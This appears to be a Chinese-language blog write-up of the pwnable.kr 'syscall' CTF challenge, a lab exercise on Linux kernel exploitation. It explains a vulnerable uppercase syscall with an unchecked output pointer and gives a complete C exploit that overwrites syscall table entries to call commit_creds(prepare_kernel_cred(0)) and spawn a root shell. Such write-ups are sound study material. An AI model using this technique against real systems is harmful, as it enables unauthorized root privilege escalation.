---
layout: post
title: pwnable.kr syscall
date: 2023-05-23 14:57 +0800
categories: [ctf,pwn]
tag: [pwn, kernel]
---


## 题目描述

* 实现了一个内核模块，里面新增了一个系统调用，用于转成大写
  

从源码可以看到，这里没有对out进行任何校验
```c
asmlinkage long sys_upper(char *in, char* out){
	int len = strlen(in);
	int i;
	for(i=0; i<len; i++){
		if(in[i]>=0x61 && in[i]<=0x7a){
			out[i] = in[i] - 0x20;
		}
		else{
			out[i] = in[i];
		}
	}
	return 0;
}
```

Linux系统下，每个进程拥有其对应的`struct cred`，用于记录该进程的uid。内核exploit的目的，便是修改当前进程的cred，从而提升权限。进程本身无法篡改自己的cred，我们需要在内核空间中，通过以下方式来达到这一目的：
`commit_creds(prepare_kernel_cred(0))`

* `prepare_kernel_cred`：创建一个新的cred，参数为0则将cred中的uid, gid设置为0，对应于root用户。* `commit_creds`将这个cred应用于当前进程。此时，进程便提升到了root权限。

这些方法的地址，可以通过`/proc/kallsyms`获取
```bash
/ $ cat /proc/kallsyms |grep commit_creds
8003f56c T commit_creds
8044548c r __ksymtab_commit_creds
8044ffc8 r __kstrtab_commit_creds
/ $ cat /proc/kallsyms |grep prepare_kernel_cred
8003f924 T prepare_kernel_cred
80447f34 r __ksymtab_prepare_kernel_cred
8044ff8c r __kstrtab_prepare_kernel_cred
```

## 解法一：替换系统调用表地址
因为地址`0x8003f56c`的0x6c会受到SYS_UPPER这个自建系统调用的影响，因此考虑地址`0x8003f560`,此时只要把其前面的内容换成无意义指令即可。`0x90(nop)`不知道为何无法成功。
```asm
inc eax ; => \x40
```
### 寻找合适的系统调用
* 在`https://x86.syscall.sh/`上，可以找到所有的系统调用和他的参数
* 简单试了几个，如下目前是可用的，可以发现，几个参数没所谓

```bash
10 unlink (const char *pathname)
13 time (time_t *tloc)
25 stime (time_t *tptr)
93 ftruncate (unsigned int fd, unsigned long length)
100 fstatfs	(unsigned int fd, struct statfs *buf)
```


## 参考exp


```c
#include <stdio.h>
#include <stdlib.h>

#define SYS_CALL_TABLE 0x8000e348 // manually configure this address!!
#define SYS_UPPER 223
unsigned int** sct;

unsigned int EXIT = 1;
unsigned int UNLINK = 10;

int main(int argc, char **argv){
    sct = (unsigned int**)SYS_CALL_TABLE;

    syscall(SYS_UPPER, "\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40", (unsigned int**)(0x8003f560));
	
    syscall(SYS_UPPER, "\x24\xf9\x03\x80", &sct[EXIT]); //prepare_kernel_cred
    syscall(SYS_UPPER, "\x60\xf5\x03\x80", &sct[UNLINK]); //commit_creds

    syscall(UNLINK, syscall(EXIT, 0));

    system("/bin/sh");
    return 0;
}
```

